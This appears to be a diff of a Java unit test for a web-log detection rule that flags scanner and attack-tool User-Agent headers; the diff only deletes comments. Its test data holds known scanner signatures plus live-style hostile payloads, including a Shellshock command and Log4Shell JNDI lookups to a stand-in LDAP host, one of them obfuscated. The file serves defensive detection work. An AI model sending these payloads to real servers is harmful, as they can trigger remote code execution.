@@ -13,16 +13,11 @@ import org.junit.jupiter.params.ParameterizedTest;
 import org.junit.jupiter.params.provider.CsvSource;
 import org.junit.jupiter.params.provider.ValueSource;
 
-/**
- * The built-in scanner User-Agent rule, fed combined-format lines through the production access-log
- * parser.
- */
 class ScannerUserAgentRuleTest {
 
     private final AccessLogParser accessLogs = new AccessLogParser();
     private final RuleEngine engine = new RuleEngine(List.of(ScannerUserAgentRule.rule()));
 
-    /** A combined-format line for {@code GET /}, answered {@code status}, sent by {@code agent}. */
     private NormalizedEvent request(String agent, int status) {
         String line =
                 ("198.51.100.23 - - [14/Sep/2026:10:15:30 +0000] \"GET /admin HTTP/1.1\" %d 512"
@@ -56,7 +51,6 @@ class ScannerUserAgentRuleTest {
     @ParameterizedTest
     @ValueSource(
             strings = {
-                // Attack tools under their default headers, whatever the server answered.
                 "sqlmap/1.7.2#stable (https://sqlmap.org)",
                 "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)",
                 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
@@ -73,7 +67,6 @@ class ScannerUserAgentRuleTest {
                 "ZmEu",
                 "Morfeus Fucking Scanner",
                 "NESSUS::SOAP",
-                // Payloads aimed at whatever logs or parses the header.
                 "() { :; }; /bin/bash -c id",
                 "${jndi:ldap://203.0.113.5:1389/a}",
                 "${${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.5/a}",
@@ -113,12 +106,10 @@ class ScannerUserAgentRuleTest {
     @CsvSource(
             delimiter = '|',
             value = {
-                // Command-line clients the server answered: health checks, scripts, redirects.
                 "curl/8.4.0|200",
                 "Wget/1.21.4|304",
                 "python-requests/2.31.0|201",
                 "Go-http-client/2.0|302",
-                // Browsers, crawlers and apps, whatever they were answered.
                 "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0|200",
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
                         + " Chrome/129.0.0.0 Safari/537.36|404",
@@ -128,7 +119,6 @@ class ScannerUserAgentRuleTest {
                 "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)|200",
                 "okhttp/4.12.0|200",
                 "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/AP2A.240905.003)|404",
-                // Tool names inside a longer word, and lookalikes of the payloads.
                 "HydrangeaBrowser/1.0|404",
                 "nmapper-dashboard/2.0|404",
                 "Mozilla/5.0 (Macintosh) Sleepy/1.0 (compatible; sleep tracker)|200",
@@ -146,8 +136,7 @@ class ScannerUserAgentRuleTest {
 
     @Test
     void hostileHeadersStayFast() {
-        // Each pads a near-match with what the possessive runs consume, so a pattern that
-        // backtracked would take quadratic time or worse.
+
         List<String> agents =
                 List.of(
                         "(" + " ".repeat(100_000) + ")" + " ".repeat(100_000) + "x",
